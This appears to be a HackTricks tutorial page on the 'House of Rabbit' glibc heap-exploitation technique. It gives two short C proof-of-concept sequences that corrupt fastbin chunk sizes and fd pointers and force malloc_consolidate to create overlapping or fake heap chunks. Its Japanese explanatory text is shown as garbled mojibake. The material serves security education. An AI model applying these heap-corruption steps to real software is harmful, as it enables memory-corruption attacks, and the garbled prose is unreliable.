# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### è¦ä»¶

1. **ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ã®fdãƒã‚¤ãƒ³ã‚¿ã¾ãŸã¯ã‚µã‚¤ã‚ºã‚’å¤‰æ›´ã™ã‚‹èƒ½åŠ›**: ã“ã‚Œã¯ã€ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³å†…ã®ãƒãƒ£ãƒ³ã‚¯ã®å‰æ–¹ãƒã‚¤ãƒ³ã‚¿ã¾ãŸã¯ãã®ã‚µã‚¤ã‚ºã‚’å¤‰æ›´ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚
2. **`malloc_consolidate`ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹èƒ½åŠ›**: ã“ã‚Œã¯ã€å¤§ããªãƒãƒ£ãƒ³ã‚¯ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã‹ã€ãƒˆãƒƒãƒ—ãƒãƒ£ãƒ³ã‚¯ã‚’ãƒãƒ¼ã‚¸ã™ã‚‹ã“ã¨ã§è¡Œã†ã“ã¨ãŒã§ãã€ãƒ’ãƒ¼ãƒ—ãŒãƒãƒ£ãƒ³ã‚¯ã‚’çµ±åˆã™ã‚‹ã“ã¨ã‚’å¼·åˆ¶ã—ã¾ã™ã€‚

### ç›®æ¨™

1. **ã‚ªãƒ¼ãƒãƒ¼ãƒ©ãƒƒãƒ—ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆã™ã‚‹**: 1ã¤ã®ãƒãƒ£ãƒ³ã‚¯ãŒåˆ¥ã®ãƒãƒ£ãƒ³ã‚¯ã¨ã‚ªãƒ¼ãƒãƒ¼ãƒ©ãƒƒãƒ—ã™ã‚‹ã‚ˆã†ã«ã—ã€ã•ã‚‰ãªã‚‹ãƒ’ãƒ¼ãƒ—æ“ä½œã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
2. **å½ã®ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆã™ã‚‹**: ãƒ’ãƒ¼ãƒ—æ“ä½œä¸­ã«ã‚¢ãƒ­ã‚±ãƒ¼ã‚¿ã‚’é¨™ã—ã¦ã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã‚’æ­£å½“ãªãƒãƒ£ãƒ³ã‚¯ã¨ã—ã¦æ‰±ã‚ã›ã‚‹ã“ã¨ã§ã™ã€‚

## æ”»æ’ƒã®æ‰‹é †

### POC 1: ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã‚’å¤‰æ›´ã™ã‚‹

**ç›®çš„**: ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã‚’æ“ä½œã—ã¦ã‚ªãƒ¼ãƒãƒ¼ãƒ©ãƒƒãƒ—ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆã—ã¾ã™ã€‚

* **ã‚¹ãƒ†ãƒƒãƒ— 1: ãƒãƒ£ãƒ³ã‚¯ã‚’å‰²ã‚Šå½“ã¦ã‚‹**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
We allocate two chunks of 0x40 bytes each. These chunks will be placed in the fast bin list once freed.

* **ã‚¹ãƒ†ãƒƒãƒ— 2: ãƒãƒ£ãƒ³ã‚¯ã‚’è§£æ”¾ã™ã‚‹**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
We free both chunks, adding them to the fastbin list.

* **ã‚¹ãƒ†ãƒƒãƒ— 3: ãƒãƒ£ãƒ³ã‚¯ã‚µã‚¤ã‚ºã®å¤‰æ›´**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
We change the size metadata of `chunk1` to 0xa1. This is a crucial step to trick the allocator during consolidation.

* **ã‚¹ãƒ†ãƒƒãƒ— 4: `malloc_consolidate` ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
å¤§ããªãƒãƒ£ãƒ³ã‚¯ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã¨ã€`malloc_consolidate`é–¢æ•°ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã€å°ã•ãªãƒãƒ£ãƒ³ã‚¯ãŒãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ã§ãƒãƒ¼ã‚¸ã•ã‚Œã¾ã™ã€‚æ“ä½œã•ã‚ŒãŸ`chunk1`ã®ã‚µã‚¤ã‚ºã«ã‚ˆã‚Šã€`chunk1`ãŒ`chunk2`ã¨é‡ãªã‚Šã¾ã™ã€‚

çµ±åˆå¾Œã€`chunk1`ã¯`chunk2`ã¨é‡ãªã‚Šã€ã•ã‚‰ãªã‚‹æ‚ªç”¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

### POC 2: `fd`ãƒã‚¤ãƒ³ã‚¿ã‚’å¤‰æ›´ã™ã‚‹

**ç›®çš„**: ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ã®`fd`ãƒã‚¤ãƒ³ã‚¿ã‚’æ“ä½œã—ã¦ãƒ•ã‚§ã‚¤ã‚¯ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆã—ã¾ã™ã€‚

* **ã‚¹ãƒ†ãƒƒãƒ— 1: ãƒãƒ£ãƒ³ã‚¯ã‚’å‰²ã‚Šå½“ã¦ã‚‹**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**èª¬æ˜**: å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ãŸã‚ã«ãƒ’ãƒ¼ãƒ—ã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ã€1ã¤ã¯å°ã•ãã€ã‚‚ã†1ã¤ã¯å¤§ãã„2ã¤ã®ãƒãƒ£ãƒ³ã‚¯ã‚’å‰²ã‚Šå½“ã¦ã¾ã™ã€‚

* **ã‚¹ãƒ†ãƒƒãƒ— 2: å½ã®ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆ**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
We write fake chunk metadata into `chunk2` to simulate smaller chunks.

* **ã‚¹ãƒ†ãƒƒãƒ— 3: `chunk1` ã‚’è§£æ”¾ã™ã‚‹**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**èª¬æ˜**: `chunk1`ã‚’è§£æ”¾ã—ã€fastbinãƒªã‚¹ãƒˆã«è¿½åŠ ã—ã¾ã™ã€‚

* **ã‚¹ãƒ†ãƒƒãƒ— 4: `chunk1`ã®`fd`ã‚’å¤‰æ›´ã™ã‚‹**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**èª¬æ˜**: `chunk1`ã®å‰æ–¹ãƒã‚¤ãƒ³ã‚¿ï¼ˆ`fd`ï¼‰ã‚’å¤‰æ›´ã—ã¦ã€`chunk2`å†…ã®å½ãƒãƒ£ãƒ³ã‚¯ã‚’æŒ‡ã™ã‚ˆã†ã«ã—ã¾ã™ã€‚

* **ã‚¹ãƒ†ãƒƒãƒ—5: `malloc_consolidate`ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
å¤§ããªãƒãƒ£ãƒ³ã‚¯ã‚’å†åº¦å‰²ã‚Šå½“ã¦ã‚‹ã¨ã€`malloc_consolidate`ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã€å½ã®ãƒãƒ£ãƒ³ã‚¯ãŒå‡¦ç†ã•ã‚Œã¾ã™ã€‚

å½ã®ãƒãƒ£ãƒ³ã‚¯ã¯ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ãƒªã‚¹ãƒˆã®ä¸€éƒ¨ã¨ãªã‚Šã€ã•ã‚‰ãªã‚‹æ‚ªç”¨ã®ãŸã‚ã®æ­£å½“ãªãƒãƒ£ãƒ³ã‚¯ã¨ãªã‚Šã¾ã™ã€‚

### æ¦‚è¦

**House of Rabbit**æŠ€è¡“ã¯ã€ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã‚’å¤‰æ›´ã—ã¦ã‚ªãƒ¼ãƒãƒ¼ãƒ©ãƒƒãƒ—ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆã™ã‚‹ã‹ã€`fd`ãƒã‚¤ãƒ³ã‚¿ã‚’æ“ä½œã—ã¦å½ã®ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒ’ãƒ¼ãƒ—å†…ã«æ­£å½“ãªãƒãƒ£ãƒ³ã‚¯ã‚’å½é€ ã—ã€ã•ã¾ã–ã¾ãªå½¢æ…‹ã®æ‚ªç”¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¹ãƒ†ãƒƒãƒ—ã‚’ç†è§£ã—ã€å®Ÿè·µã™ã‚‹ã“ã¨ã§ã€ãƒ’ãƒ¼ãƒ—ã®æ‚ªç”¨ã‚¹ã‚­ãƒ«ã‚’å‘ä¸Šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
